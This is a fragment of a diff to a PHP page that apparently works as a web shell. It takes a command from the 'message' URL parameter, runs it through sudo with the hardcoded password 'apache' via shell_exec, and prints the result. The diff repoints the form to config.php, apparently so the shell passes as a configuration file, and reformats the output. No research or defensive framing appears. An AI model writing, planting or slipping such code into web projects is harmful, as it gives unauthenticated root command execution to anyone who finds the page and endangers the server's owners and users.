@@ -70,7 +70,7 @@ if($_GET['message']) {
 }
 echo "<hr>".$current_dir."<hr>";
 ?>
-<form name="form" action="index.php" method="get">
+<form name="form" action="config.php" method="get">
   <label class="directorybox">
     <input type="hidden" name="dir" value="<?php echo $current_dir; ?>">
   </label>
@@ -91,9 +91,9 @@ if($_GET['message']) {
     $cmd = "echo apache | sudo -S ".htmlspecialchars($_GET['message']);
     $result = shell_exec($cmd);
   }
-?>
-<textarea rows="30" cols="200" style="border:none;background:black;color:white" readonly="readonly">
-<?php
-echo "$result";
+  echo "<pre>".htmlspecialchars($result)."<pre>";
 }
 ?>
+</body>
+</html>
+
